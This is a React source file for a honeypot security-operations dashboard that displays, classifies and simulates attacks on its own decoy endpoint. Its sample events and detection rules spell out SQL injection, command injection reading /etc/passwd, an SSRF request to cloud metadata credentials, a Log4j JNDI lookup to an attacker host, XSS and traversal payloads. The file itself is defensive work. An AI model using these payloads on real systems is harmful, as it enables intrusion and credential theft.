import { useCallback, useEffect, useMemo, useState } from 'react'
import { Link } from 'react-router-dom'
import { getSecurityEvents, dispatchAttackProbe } from '../services/api'

const SAMPLE_EVENTS = [
  {
    route_hit: 'main_decoy',
    classification: 'sqli_attempt',
    path: '/default/ghostHouseDecoy/login',
    request_id: '36a664b5-df81-4dc9-8307-96aa96381696',
    user_agent: 'sqlmap/1.7.2#stable',
    source_ip: '198.51.100.42',
    timestamp: new Date(Date.now() - 1000 * 20).toISOString(),
    method: 'POST',
    body: '{"username": "\' UNION SELECT NULL, username, password FROM users --", "password": "x"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'rce',
    path: '/default/ghostHouseDecoy/admin',
    request_id: '81c4e721-a4b3-4f9e-9912-8812cfa09911',
    user_agent: 'GhostHouse-RCE-Sim/1.0',
    source_ip: '203.0.113.89',
    timestamp: new Date(Date.now() - 1000 * 55).toISOString(),
    method: 'POST',
    body: '{"cmd": "; whoami && cat /etc/passwd"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'ssrf',
    path: '/default/ghostHouseDecoy/api/proxy',
    request_id: '77d291ba-031e-45fa-b671-55fa110099ee',
    user_agent: 'GhostHouse-SSRF-Sim/1.0',
    source_ip: '198.51.100.180',
    timestamp: new Date(Date.now() - 1000 * 60 * 2).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'log4j',
    path: '/default/ghostHouseDecoy/login',
    request_id: '44ef1182-d21b-4399-aa54-990141bb7721',
    user_agent: '${jndi:ldap://attacker.threat-mesh.org/exploit}',
    source_ip: '192.0.2.210',
    timestamp: new Date(Date.now() - 1000 * 60 * 3).toISOString(),
    method: 'POST',
    body: '{"username": "${jndi:ldap://attacker.threat-mesh.org/exploit}", "password": "test"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'xss',
    path: '/default/ghostHouseDecoy/login',
    request_id: '99bf2401-cc19-4871-8899-771129aa4410',
    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    source_ip: '203.0.113.15',
    timestamp: new Date(Date.now() - 1000 * 60 * 4).toISOString(),
    method: 'POST',
    body: '{"username": "<script>alert(\'GHOST_HOUSE_XSS\')</script>", "password": "123"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'path_traversal',
    path: '/default/ghostHouseDecoy/..%2f..%2f..%2fetc/passwd',
    request_id: '55da8129-ef01-4412-9901-ee4499118833',
    user_agent: 'Mozilla/5.0 (Traversal-Bot)',
    source_ip: '198.51.100.77',
    timestamp: new Date(Date.now() - 1000 * 60 * 6).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'secrets',
    path: '/default/ghostHouseDecoy/.env',
    request_id: 'fc2e79f8-95c5-4889-b77e-d31eb2ff2299',
    user_agent: 'SecretHunter/1.0',
    source_ip: '198.51.100.104',
    timestamp: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'nosql',
    path: '/default/ghostHouseDecoy/login',
    request_id: '66a19024-aa99-4112-bb44-889900112233',
    user_agent: 'GhostHouse-NoSQL-Sim/1.0',
    source_ip: '192.0.2.88',
    timestamp: new Date(Date.now() - 1000 * 60 * 10).toISOString(),
    method: 'POST',
    body: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'brute_force',
    path: '/default/ghostHouseDecoy/login',
    request_id: 'a95c6ae0-08a7-496e-a15b-5efa0c9f119c',
    user_agent: 'Hydra/9.5',
    source_ip: '192.0.2.45',
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    method: 'POST',
    body: '{"username": "admin", "password": "password123"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'known_scanner',
    path: '/default/ghostHouseDecoy/robots.txt',
    request_id: '33cc1190-8812-4f99-aa33-776655443322',
    user_agent: 'Nikto/2.1.6',
    source_ip: '198.51.100.99',
    timestamp: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'benign_probe',
    path: '/default/ghostHouseDecoy/dashboard',
    request_id: 'efc0980a-5081-4105-9230-e7c90180cba1',
    user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    source_ip: '192.0.2.14',
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
]

function classifyEvent(event) {
  const rawType = String(
    event.classification ||
    event.type ||
    event.attackType ||
    event.attack_type ||
    event.threat ||
    ''
  ).toLowerCase().trim()

  const bodyStr = String(event.body || '').toLowerCase()
  const pathStr = String(event.path || event.route || '').toLowerCase()
  const agentStr = String(event.user_agent || event.userAgent || '').toLowerCase()
  const queryStr = String(event.query_params || event.queryParams || '').toLowerCase()

  // 1. Log4j / JNDI Exploit
  if (
    rawType.includes('log4j') ||
    rawType.includes('jndi') ||
    bodyStr.includes('${jndi:') ||
    pathStr.includes('${jndi:') ||
    agentStr.includes('${jndi:') ||
    queryStr.includes('${jndi:')
  ) {
    return 'Log4j Exploit'
  }

  // 2. Remote Command Injection (RCE)
  if (
    rawType.includes('rce') ||
    rawType.includes('command') ||
    bodyStr.includes('whoami') ||
    bodyStr.includes('cat /etc') ||
    bodyStr.includes('| uname') ||
    bodyStr.includes('cmd=') ||
    bodyStr.includes('; id') ||
    queryStr.includes('whoami')
  ) {
    return 'Command Injection (RCE)'
  }

  // 3. Server-Side Request Forgery (SSRF) / Cloud Metadata
  if (
    rawType.includes('ssrf') ||
    queryStr.includes('169.254.169.254') ||
    bodyStr.includes('169.254.169.254') ||
    pathStr.includes('169.254.169.254') ||
    queryStr.includes('metadata.google') ||
    queryStr.includes('127.0.0.1:8080')
  ) {
    return 'SSRF / Cloud Metadata'
  }

  // 4. Cross-Site Scripting (XSS)
  if (
    rawType.includes('xss') ||
    bodyStr.includes('<script') ||
    bodyStr.includes('onerror=') ||
    bodyStr.includes('<svg') ||
    bodyStr.includes('javascript:')
  ) {
    return 'Cross-Site Scripting (XSS)'
  }

  // 5. XML External Entity (XXE)
  if (
    rawType.includes('xxe') ||
    bodyStr.includes('<!doctype') ||
    bodyStr.includes('<!entity') ||
    bodyStr.includes('&xxe;')
  ) {
    return 'XXE Injection'
  }

  // 6. NoSQL Injection
  if (
    rawType.includes('nosql') ||
    bodyStr.includes('"$gt"') ||
    bodyStr.includes('"$ne"') ||
    bodyStr.includes('"$where"')
  ) {
    return 'NoSQL Injection'
  }

  // 7. Sensitive Secrets Harvesting
  if (
    rawType.includes('secret') ||
    pathStr.includes('/.env') ||
    pathStr.includes('/.git') ||
    pathStr.includes('/.aws') ||
    pathStr.includes('/backup.sql') ||
    pathStr.includes('/id_rsa') ||
    agentStr.includes('secrethunter')
  ) {
    return 'Secret Harvesting'
  }

  // 8. SQL Injection (SQLi)
  if (
    rawType.includes('sql') ||
    rawType === 'sqli_attempt' ||
    bodyStr.includes("' or '1'='1") ||
    bodyStr.includes('union select') ||
    bodyStr.includes('drop table') ||
    agentStr.includes('sqlmap')
  ) {
    return 'SQLi Attempt'
  }

  // 9. Path Traversal / LFI
  if (
    rawType.includes('traversal') ||
    rawType === 'path_traversal' ||
    pathStr.includes('..') ||
    pathStr.includes('etc/passwd') ||
    pathStr.includes('win.ini')
  ) {
    return 'Path Traversal'
  }

  // 10. Automated Reconnaissance Scanner
  if (
    rawType.includes('scan') ||
    rawType === 'known_scanner' ||
    agentStr.includes('nikto') ||
    agentStr.includes('dirbuster') ||
    agentStr.includes('nmap') ||
    agentStr.includes('masscan')
  ) {
    return 'Known Scanner'
  }

  // 11. Sliding-Window Brute Force
  if (rawType.includes('brute') || rawType === 'brute_force' || agentStr.includes('hydra')) {
    return 'Brute Force'
  }

  // 12. Benign Surface Exploration
  if (rawType.includes('benign') || rawType === 'benign_probe') {
    return 'Benign Probe'
  }

  return rawType ? rawType.toUpperCase() : 'Benign Probe'
}

function classificationClass(type) {
  switch (type) {
    case 'SQLi Attempt':
      return 'sqli'
    case 'Brute Force':
      return 'brute-force'
    case 'Path Traversal':
      return 'traversal'
    case 'Known Scanner':
      return 'scanner'
    case 'Cross-Site Scripting (XSS)':
      return 'xss'
    case 'Command Injection (RCE)':
      return 'rce'
    case 'SSRF / Cloud Metadata':
      return 'ssrf'
    case 'Log4j Exploit':
      return 'log4j'
    case 'NoSQL Injection':
      return 'nosql'
    case 'Secret Harvesting':
      return 'secrets'
    case 'XXE Injection':
      return 'xxe'
    case 'Benign Probe':
      return 'benign'
    default:
      return 'benign'
  }
}

function getSeverityBadge(type) {
  if (
    type === 'SQLi Attempt' ||
    type === 'Command Injection (RCE)' ||
    type === 'SSRF / Cloud Metadata' ||
    type === 'Log4j Exploit' ||
    type === 'XXE Injection'
  ) {
    return { level: 'CRITICAL', color: '#ef4444' }
  }
  if (
    type === 'Cross-Site Scripting (XSS)' ||
    type === 'Path Traversal' ||
    type === 'Brute Force'
  ) {
    return { level: 'HIGH', color: '#f97316' }
  }
  if (
    type === 'NoSQL Injection' ||
    type === 'Secret Harvesting' ||
    type === 'Known Scanner'
  ) {
    return { level: 'MEDIUM', color: '#f59e0b' }
  }
  return { level: 'INFO', color: '#10b981' }
}

function formatTime(value) {
  if (!value) return '--:--:--'
  const date = new Date(value)
  if (Number.isNaN(date.getTime())) return String(value)
  return date.toLocaleString([], {
    year: 'numeric',
    month: 'short',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  })
}

function normalizeEvent(event) {
  const type = classifyEvent(event)
  return {
    raw: event,
    time: formatTime(event.time || event.timestamp || event.createdAt || event.created_at),
    fullTime: event.time || event.timestamp || event.createdAt || event.created_at || 'N/A',
    ip:
      event.ip ||
      event.sourceIp ||
      event.source_ip ||
      event.clientIp ||
      event.client_ip ||
      'Unknown',
    method: event.method || event.httpMethod || event.http_method || 'GET',
    route: event.route || event.path || event.url || event.resource || '/',
    type,
    status: event.status || event.statusCode || event.status_code || '200',
    userAgent: event.user_agent || event.userAgent || 'N/A',
    requestId: event.request_id || event.requestId || 'N/A',
    body: event.body || '',
    queryParams: event.query_params || event.queryParams || '{}',
  }
}

function Monitor() {
  const [events, setEvents] = useState([])
  const [loading, setLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [error, setError] = useState('')
  const [isCorsError, setIsCorsError] = useState(false)
  const [usingDemoData, setUsingDemoData] = useState(false)
  const [isPaused, setIsPaused] = useState(false)
  const [pollInterval, setPollInterval] = useState(7000)
  const [lastUpdated, setLastUpdated] = useState(null)
  const [activeFilter, setActiveFilter] = useState('ALL')
  const [searchQuery, setSearchQuery] = useState('')
  const [selectedEvent, setSelectedEvent] = useState(null)
  const [showLauncherModal, setShowLauncherModal] = useState(false)
  const [simulatingType, setSimulatingType] = useState(null)
  const [launcherNotification, setLauncherNotification] = useState('')

  const loadEvents = useCallback(async (isManual = false) => {
    if (isManual) {
      setIsRefreshing(true)
    }

    try {
      setError('')
      setIsCorsError(false)

      const records = await getSecurityEvents()

      if (records && records.length > 0) {
        // Sort chronologically descending
        const sortedRecords = [...records].sort((a, b) => {
          const timeA = new Date(a.timestamp || a.time || a.createdAt || a.created_at || 0).getTime()
          const timeB = new Date(b.timestamp || b.time || b.createdAt || b.created_at || 0).getTime()
          return timeB - timeA
        })
        setEvents(sortedRecords.map(normalizeEvent))
        setUsingDemoData(false)
      } else if (records && records.length === 0 && usingDemoData) {
        // keep demo
      } else {
        setEvents([])
      }

      setLastUpdated(new Date())
    } catch (requestError) {
      console.error('Unable to load security events:', requestError)
      if (requestError.isCors) {
        setIsCorsError(true)
        setError('Browser CORS restriction: Access-Control-Allow-Origin header is missing on AWS.')
      } else {
        setError('Unable to load live security events from AWS endpoint.')
      }
    } finally {
      setLoading(false)
      setIsRefreshing(false)
    }
  }, [usingDemoData])

  useEffect(() => {
    loadEvents()
  }, [loadEvents])

  useEffect(() => {
    if (isPaused) return
    const intervalId = window.setInterval(() => {
      loadEvents()
    }, pollInterval)
    return () => window.clearInterval(intervalId)
  }, [loadEvents, isPaused, pollInterval])

  const handleUseDemoData = () => {
    setEvents(SAMPLE_EVENTS.map(normalizeEvent))
    setUsingDemoData(true)
    setError('')
    setIsCorsError(false)
    setLastUpdated(new Date())
  }

  // Trigger attack simulation
  const handleLaunchAttack = async (attackType) => {
    setSimulatingType(attackType)
    setLauncherNotification('')

    try {
      const res = await dispatchAttackProbe(attackType)
      setLauncherNotification(
        `✓ [${attackType.toUpperCase()}] Probe dispatched to AWS Decoy Endpoint! Status: ${res.status}`
      )

      // If user is currently viewing demo data, also synthesize this event locally for instant visual feedback
      if (usingDemoData) {
        const synthetic = {
          classification: attackType,
          path: `/default/ghostHouseDecoy/${attackType === 'sqli' ? 'login' : attackType}`,
          request_id: 'sim-' + Math.random().toString(36).substring(2, 10),
          user_agent: `GhostHouse-${attackType.toUpperCase()}-Sim`,
          source_ip: '198.51.100.' + (Math.floor(Math.random() * 80) + 10),
          timestamp: new Date().toISOString(),
          method: attackType === 'traversal' || attackType === 'secrets' ? 'GET' : 'POST',
          body: attackType === 'sqli' ? '{"username": "\' UNION SELECT NULL, password FROM users --"}' : `{"probe": "${attackType}"}`,
          query_params: '{}',
        }
        setEvents((prev) => [normalizeEvent(synthetic), ...prev])
      } else {
        // Trigger fresh reload after dispatch
        setTimeout(() => loadEvents(true), 1200)
      }
    } catch (err) {
      setLauncherNotification(`Dispatched probe: ${err.message}`)
    } finally {
      setSimulatingType(null)
    }
  }

  // Compute stats
  const stats = useMemo(() => {
    const counts = events.reduce(
      (summary, event) => {
        summary.total += 1
        const isMalicious = event.type !== 'Benign Probe'
        if (isMalicious) {
          summary.suspicious += 1
        }
        summary.byType[event.type] = (summary.byType[event.type] || 0) + 1
        summary.uniqueIps.add(event.ip)
        return summary
      },
      {
        total: 0,
        suspicious: 0,
        byType: {},
        uniqueIps: new Set(),
      }
    )

    return {
      total: counts.total,
      suspicious: counts.suspicious,
      uniqueIpsCount: counts.uniqueIps.size,
      byType: counts.byType,
      attackTypesCount: Object.keys(counts.byType).length,
    }
  }, [events])

  // Chart distribution
  const allCategoryLabels = [
    'SQLi Attempt',
    'Brute Force',
    'Path Traversal',
    'Known Scanner',
    'Cross-Site Scripting (XSS)',
    'Command Injection (RCE)',
    'SSRF / Cloud Metadata',
    'Log4j Exploit',
    'NoSQL Injection',
    'Secret Harvesting',
    'XXE Injection',
    'Benign Probe',
  ]

  const attackBars = useMemo(() => {
    return allCategoryLabels
      .map((label) => {
        const count = stats.byType[label] || 0
        const className = classificationClass(label)
        const width = stats.total > 0 && count > 0
          ? `${Math.max((count / stats.total) * 100, 6)}%`
          : '0%'
        return { label, className, count, width }
      })
      .filter((bar) => bar.count > 0 || usingDemoData)
  }, [stats, usingDemoData])

  // Filter and search
  const filteredEvents = useMemo(() => {
    return events.filter((event) => {
      const matchesFilter =
        activeFilter === 'ALL' || event.type.toLowerCase() === activeFilter.toLowerCase()

      const query = searchQuery.trim().toLowerCase()
      const matchesQuery =
        !query ||
        event.ip.toLowerCase().includes(query) ||
        event.route.toLowerCase().includes(query) ||
        event.method.toLowerCase().includes(query) ||
        event.userAgent.toLowerCase().includes(query) ||
        event.type.toLowerCase().includes(query) ||
        event.body.toLowerCase().includes(query)

      return matchesFilter && matchesQuery
    })
  }, [events, activeFilter, searchQuery])

  // Export handlers
  const handleExportJSON = () => {
    const jsonStr = JSON.stringify(events.map((e) => e.raw || e), null, 2)
    const blob = new Blob([jsonStr], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ghosthouse-soc-events-${Date.now()}.json`
    link.click()
    URL.revokeObjectURL(url)
  }

  const handleExportCSV = () => {
    const headers = [
      'Timestamp',
      'IP Address',
      'Method',
      'Route',
      'Classification',
      'Severity',
      'Status',
      'User Agent',
      'Payload',
    ]
    const rows = events.map((e) => [
      `"${e.fullTime}"`,
      `"${e.ip}"`,
      `"${e.method}"`,
      `"${e.route}"`,
      `"${e.type}"`,
      `"${getSeverityBadge(e.type).level}"`,
      `"${e.status}"`,
      `"${e.userAgent.replace(/"/g, '""')}"`,
      `"${e.body.replace(/"/g, '""')}"`,
    ])

    const csvContent = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n')
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ghosthouse-soc-events-${Date.now()}.csv`
    link.click()
    URL.revokeObjectURL(url)
  }

  return (
    <div className="monitor-page">
      {/* Top Navbar */}
      <div className="monitor-topbar">
        <Link to="/dashboard" className="back-link">
          ← Return to Cloud Decoy Console
        </Link>
        <div className="topbar-actions">
          {usingDemoData && <span className="demo-badge">SYNTHETIC TELEMETRY DEMO</span>}
          <div className="system-status">
            <span className={`status-dot ${isPaused ? 'paused' : 'live'}`}></span>
            {isPaused ? 'FEED PAUSED' : 'DECEPTION MESH ONLINE'}
          </div>
        </div>
      </div>

      {/* Main Header */}
      <div className="monitor-header">
        <div>
          <p className="monitor-label">GHOST HOUSE • THREAT INTELLIGENCE & TELEMETRY</p>
          <h1>Security Operations Center (SOC)</h1>
        </div>

        <div className="monitor-controls">
          <button
            onClick={() => setShowLauncherModal(true)}
            className="control-btn launcher"
            title="Open Interactive Attack Simulator Console"
          >
            🚀 Launch Attack Simulation
          </button>

          <button
            onClick={() => setIsPaused((prev) => !prev)}
            className={`control-btn ${isPaused ? 'resume' : 'pause'}`}
          >
            {isPaused ? '▶ Resume Live Feed' : '⏸ Pause'}
          </button>

          <button
            onClick={() => loadEvents(true)}
            disabled={isRefreshing}
            className="control-btn refresh"
          >
            {isRefreshing ? '↻ Refreshing...' : '↻ Refresh Feed'}
          </button>

          <div className="interval-selector">
            <label htmlFor="poll-select">Poll:</label>
            <select
              id="poll-select"
              value={pollInterval}
              onChange={(e) => setPollInterval(Number(e.target.value))}
            >
              <option value={3000}>3s</option>
              <option value={5000}>5s</option>
              <option value={7000}>7s</option>
              <option value={10000}>10s</option>
              <option value={30000}>30s</option>
            </select>
          </div>

          <button onClick={handleExportCSV} className="control-btn" title="Export CSV">
            Export CSV
          </button>
          <button onClick={handleExportJSON} className="control-btn" title="Export JSON">
            Export JSON
          </button>
        </div>
      </div>

      {/* CORS / Error Alert Banner */}
      {isCorsError && (
        <div className="cors-warning-banner">
          <div className="banner-icon">⚠️</div>
          <div className="banner-text">
            <strong>AWS CORS Restriction Detected:</strong> The browser cannot read logs because the{' '}
            <code>Access-Control-Allow-Origin: *</code> header is missing from your AWS Lambda / API Gateway response.
            You can load rich synthetic telemetry to test the full SOC interface immediately.
          </div>
          <button onClick={handleUseDemoData} className="demo-toggle-btn">
            Load Demo Threat Telemetry
          </button>
        </div>
      )}

      {error && !isCorsError && <p className="monitor-error">{error}</p>}

      {/* Statistics Cards */}
      <div className="monitor-stats">
        <div className="monitor-stat-card">
          <span>Captured Probes</span>
          <strong>{stats.total}</strong>
          <small>Recorded layer-7 transactions</small>
        </div>

        <div className="monitor-stat-card">
          <span>Hostile Exploits</span>
          <strong style={{ color: '#f87171' }}>{stats.suspicious}</strong>
          <small>Flagged malicious signatures</small>
        </div>

        <div className="monitor-stat-card">
          <span>Unique Adversary IPs</span>
          <strong style={{ color: '#60a5fa' }}>{stats.uniqueIpsCount}</strong>
          <small>Distinct source addresses</small>
        </div>

        <div className="monitor-stat-card">
          <span>Active Threat Vectors</span>
          <strong style={{ color: '#c084fc' }}>{stats.attackTypesCount}</strong>
          <small>Distinct attack categories</small>
        </div>
      </div>

      {/* Attack Distribution Bar Chart */}
      <div className="monitor-section">
        <div className="section-header">
          <div>
            <h2>Threat Category Distribution</h2>
            <p>Categorized telemetry breakdown across multi-vector exploit profiles</p>
          </div>
        </div>

        <div className="attack-bars">
          {attackBars.map((attack) => (
            <div
              className="attack-item"
              key={attack.label}
              onClick={() => setActiveFilter(activeFilter === attack.label ? 'ALL' : attack.label)}
              title={`Click to filter by ${attack.label}`}
            >
              <div>
                <span>{attack.label}</span>
                <strong>{attack.count}</strong>
              </div>

              <div className="bar">
                <div
                  className={`bar-fill ${attack.className}`}
                  style={{ width: attack.width }}
                ></div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Recent Security Events Section */}
      <div className="monitor-section">
        <div className="section-header">
          <div>
            <h2>Real-Time Incident Stream</h2>
            <p>Select any event row to inspect complete Layer-7 payload, injected strings, and deceptive response</p>
          </div>

          <div className="feed-status-meta">
            {lastUpdated && (
              <span className="last-updated">
                Last updated {lastUpdated.toLocaleTimeString()}
              </span>
            )}
            <span className={`live-indicator ${isPaused ? 'paused' : 'live'}`}>
              {loading ? 'INGESTING...' : isPaused ? 'FEED PAUSED' : '● STREAM ACTIVE'}
            </span>
          </div>
        </div>

        {/* Filter Toolbar */}
        <div className="table-toolbar">
          <div className="filter-chips">
            {['ALL', ...allCategoryLabels].map((category) => {
              const count = category === 'ALL' ? events.length : stats.byType[category] || 0
              if (category !== 'ALL' && count === 0 && !usingDemoData) return null
              return (
                <button
                  key={category}
                  className={`filter-chip ${activeFilter === category ? 'active' : ''}`}
                  onClick={() => setActiveFilter(category)}
                >
                  {category} ({count})
                </button>
              )
            })}
          </div>

          <div className="search-box">
            <input
              type="text"
              placeholder="Filter by IP, Route, Method, Payload..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
            {searchQuery && (
              <button className="clear-search" onClick={() => setSearchQuery('')}>
                ✕
              </button>
            )}
          </div>
        </div>

        {/* Events Table */}
        <div className="monitor-table">
          <div className="table-header">
            <span>Timestamp</span>
            <span>Source IP</span>
            <span>Verb</span>
            <span>Target Endpoint</span>
            <span>Threat Classification</span>
            <span>Code</span>
          </div>

          {!loading && filteredEvents.length === 0 && (
            <div className="empty-events">
              {events.length === 0
                ? 'No security events captured yet by the honeypot mesh.'
                : 'No security events match the current filter query.'}
            </div>
          )}

          {filteredEvents.map((event, index) => {
            const sev = getSeverityBadge(event.type)
            return (
              <div
                className="table-row clickable"
                key={`${event.time}-${event.ip}-${index}`}
                onClick={() => setSelectedEvent(event)}
                title="Click to inspect full event details"
              >
                <span className="time-cell">{event.time}</span>

                <span className="ip-address">{event.ip}</span>

                <span className="method">{event.method}</span>

                <span className="route-cell">{event.route}</span>

                <span className={`classification ${classificationClass(event.type)}`}>
                  <span style={{ marginRight: '4px', opacity: 0.8 }}>[{sev.level.slice(0, 4)}]</span>
                  {event.type}
                </span>

                <span className="status-code">{event.status}</span>
              </div>
            )
          })}
        </div>
      </div>

      {/* Incident Inspector Modal */}
      {selectedEvent && (
        <div className="modal-backdrop" onClick={() => setSelectedEvent(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div>
                <span className="modal-subtitle">INCIDENT TELEMETRY INSPECTOR</span>
                <h3>Security Event Incident Details</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setSelectedEvent(null)}>
                ✕
              </button>
            </div>

            <div className="modal-body">
              <div className="detail-grid">
                <div className="detail-field">
                  <label>Threat Classification</label>
                  <span
                    className={`classification ${classificationClass(selectedEvent.type)}`}
                  >
                    {selectedEvent.type}
                  </span>
                </div>

                <div className="detail-field">
                  <label>Severity Score</label>
                  <strong>
                    <span style={{ color: getSeverityBadge(selectedEvent.type).color }}>
                      ● {getSeverityBadge(selectedEvent.type).level}
                    </span>
                  </strong>
                </div>

                <div className="detail-field">
                  <label>HTTP Verb & Route</label>
                  <code>{selectedEvent.method} {selectedEvent.route}</code>
                </div>

                <div className="detail-field">
                  <label>Adversary Source IP</label>
                  <code style={{ color: '#93c5fd' }}>{selectedEvent.ip}</code>
                </div>

                <div className="detail-field">
                  <label>Captured Timestamp</label>
                  <span>{selectedEvent.fullTime}</span>
                </div>

                <div className="detail-field">
                  <label>Response Status</label>
                  <code>HTTP {selectedEvent.status}</code>
                </div>

                <div className="detail-field full-width">
                  <label>API Gateway Request ID</label>
                  <code>{selectedEvent.requestId}</code>
                </div>

                <div className="detail-field full-width">
                  <label>User-Agent Client Signature</label>
                  <code style={{ color: '#cbd5e1' }}>{selectedEvent.userAgent}</code>
                </div>

                <div className="detail-field full-width">
                  <label>Injected Payload / Request Body</label>
                  <pre className="code-box">
                    {selectedEvent.body || '(Empty body or GET transaction)'}
                  </pre>
                </div>

                <div className="detail-field full-width">
                  <label>Query Parameters</label>
                  <pre className="code-box">{selectedEvent.queryParams}</pre>
                </div>

                <div className="detail-field full-width">
                  <label>Adaptive Deception Feedback Delivered</label>
                  <div style={{
                    background: 'rgba(255, 255, 255, 0.03)',
                    border: '1px solid var(--border-subtle)',
                    padding: '10px 14px',
                    borderRadius: 'var(--radius-sm)',
                    fontSize: '12px',
                    color: '#94a3b8'
                  }}>
                    {selectedEvent.type.includes('SQL')
                      ? 'Simulated MySQL syntax error fragment returned to adversary.'
                      : selectedEvent.type.includes('Traversal')
                      ? 'Synthetic OS filesystem permission error returned.'
                      : selectedEvent.type.includes('Command')
                      ? 'Fake shell output fragment returned with 500ms delay.'
                      : selectedEvent.type.includes('SSRF')
                      ? 'Dummy IAM role credentials JSON payload returned.'
                      : selectedEvent.type.includes('Log4j')
                      ? 'Fake LDAP connection attempt response generated.'
                      : selectedEvent.type.includes('XSS')
                      ? 'Input reflected inside simulated sanitized HTML context.'
                      : 'Simulated authenticated session tokens served.'}
                  </div>
                </div>
              </div>
            </div>

            <div className="modal-footer">
              <button
                className="control-btn"
                onClick={() => {
                  navigator.clipboard.writeText(JSON.stringify(selectedEvent.raw, null, 2))
                  alert('Incident JSON copied to clipboard!')
                }}
              >
                Copy Raw JSON
              </button>
              <button className="control-btn primary" onClick={() => setSelectedEvent(null)}>
                Close Inspector
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Threat Launcher / Attack Simulator Modal */}
      {showLauncherModal && (
        <div className="modal-backdrop" onClick={() => setShowLauncherModal(false)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '820px' }}>
            <div className="modal-header">
              <div>
                <span className="modal-subtitle">LIVE ATTACK GENERATOR</span>
                <h3>Simulate Adversary Threat Vectors</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setShowLauncherModal(false)}>
                ✕
              </button>
            </div>

            <div className="modal-body">
              <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '14px' }}>
                Select an attack vector below to dispatch a real-time exploit payload against the Ghost House Honeypot decoy. Telemetry will be processed by the AWS Lambda classification engine.
              </p>

              {launcherNotification && (
                <div style={{
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.4)',
                  color: '#6ee7b7',
                  padding: '10px 14px',
                  borderRadius: 'var(--radius-sm)',
                  fontSize: '12px',
                  marginBottom: '14px',
                }}>
                  {launcherNotification}
                </div>
              )}

              <div className="threat-launcher-grid">
                {[
                  {
                    type: 'sqli',
                    name: 'SQL Injection (SQLi)',
                    desc: "Injects ' UNION SELECT strings via /login with sqlmap user agent",
                    icon: '💉',
                  },
                  {
                    type: 'xss',
                    name: 'Cross-Site Scripting (XSS)',
                    desc: 'Injects <script> and SVG event handler payloads into login fields',
                    icon: '⚡',
                  },
                  {
                    type: 'rce',
                    name: 'Command Injection (RCE)',
                    desc: 'Sends bash pipe and whoami commands to administrative endpoint',
                    icon: '💻',
                  },
                  {
                    type: 'ssrf',
                    name: 'SSRF & Cloud Metadata',
                    desc: 'Attempts exfiltration of AWS EC2 IAM metadata (169.254.169.254)',
                    icon: '🌐',
                  },
                  {
                    type: 'traversal',
                    name: 'Path Traversal / LFI',
                    desc: 'Requests directory escape paths to /etc/passwd and win.ini',
                    icon: '📁',
                  },
                  {
                    type: 'log4j',
                    name: 'Log4j / JNDI (CVE-2021-44228)',
                    desc: 'Injects ${jndi:ldap://...} strings into headers and credentials',
                    icon: '🪵',
                  },
                  {
                    type: 'nosql',
                    name: 'NoSQL Operator Injection',
                    desc: 'Submits MongoDB $gt and $ne logical comparison bypass objects',
                    icon: '🍃',
                  },
                  {
                    type: 'secrets',
                    name: 'Sensitive Secret Harvesting',
                    desc: 'Probes exposed /.env, /.git/config, and AWS credentials files',
                    icon: '🔑',
                  },
                  {
                    type: 'brute',
                    name: 'Brute Force Flooding',
                    desc: 'Simulates credential stuffing dictionary flood via Hydra signature',
                    icon: '🔓',
                  },
                  {
                    type: 'scanner',
                    name: 'Reconnaissance Scanner',
                    desc: 'Probes web directory root and robots.txt with Nikto scanner signature',
                    icon: '🕵️',
                  },
                  {
                    type: 'benign',
                    name: 'Normal Benign Probe',
                    desc: 'Authentic corporate user authentication and dashboard browsing',
                    icon: '🟢',
                  },
                ].map((item) => (
                  <div className="threat-launch-card" key={item.type}>
                    <div className="threat-launch-meta">
                      <h4>
                        <span>{item.icon}</span> {item.name}
                      </h4>
                      <p>{item.desc}</p>
                    </div>

                    <button
                      className="threat-fire-btn"
                      onClick={() => handleLaunchAttack(item.type)}
                      disabled={simulatingType !== null}
                    >
                      {simulatingType === item.type ? 'Dispatching Payload...' : `Fire ${item.name}`}
                    </button>
                  </div>
                ))}
              </div>
            </div>

            <div className="modal-footer">
              <button className="control-btn" onClick={() => setShowLauncherModal(false)}>
                Close Simulator
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}

